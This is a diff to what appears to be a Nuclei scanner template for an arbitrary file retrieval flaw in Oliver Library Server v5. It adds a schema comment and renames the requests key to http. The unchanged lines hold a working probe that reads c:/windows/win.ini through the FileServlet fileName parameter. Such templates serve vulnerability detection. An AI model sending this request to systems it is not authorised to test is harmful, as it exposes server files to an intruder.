@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oliver-library-lfi
 info:
   name: Oliver Library Server v5 <8.00.008.053 - Arbitrary File Retrieval
@@ -8,7 +9,7 @@ info:
     - https://www.exploit-db.com/exploits/50599
     - https://www.softlinkint.com/product/oliver/
   tags: windows,lfi,oliver
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini"
